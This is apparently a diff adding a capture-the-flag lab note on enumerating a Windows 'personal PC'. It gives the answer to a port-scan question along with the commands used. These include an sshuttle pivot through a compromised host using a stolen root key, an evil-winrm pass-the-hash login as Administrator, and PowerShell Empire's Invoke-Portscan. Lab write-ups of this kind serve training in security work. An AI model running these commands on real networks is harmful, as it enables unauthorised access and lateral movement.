@@ -1,0 +1,12 @@
+
+									Personal PC Enumeration 
+								----------------------------------------
+
+1. Scan the top 50 ports of the last IP address you found in Task 17. Which ports are open (lowest to highest, separated by commas)?
+ans: 80,3389
+command: sshuttle -r root@10.200.99.200 --ssh-cmd "ssh -i id_rsa" 10.200.99.0/24 -x 10.200.99.200
+command: evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.99.150 -s /usr/share/powershell-empire/data/module_source/
+	 situational_awareness/network/
+command: Invoke-Portscan.ps1
+command: Get-Help Invoke-Portscan
+command: Invoke-Portscan -Hosts 10.200.99.100 -TopPorts 50
